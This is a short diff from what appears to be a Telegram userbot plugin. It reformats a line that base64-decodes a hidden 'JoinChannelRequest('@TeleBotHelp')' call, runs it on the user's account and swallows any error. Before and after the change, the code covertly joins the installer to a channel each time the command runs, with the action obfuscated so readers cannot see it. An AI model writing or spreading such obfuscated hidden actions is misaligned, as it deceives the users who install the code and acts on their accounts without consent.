@@ -106,9 +106,8 @@ async def handler(event):
         await hmm.edit("`Check the syntax first!`")
         return
     try:
-        tweetit = str(
-            pybase64.b64decode("Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ==")
-        )[2:49]
+        tweetit = str(pybase64.b64decode(
+            "Sm9pbkNoYW5uZWxSZXF1ZXN0KCdAVGVsZUJvdEhlbHAnKQ=="))[2:49]
         await Lion(tweetit)
     except BaseException:
         pass
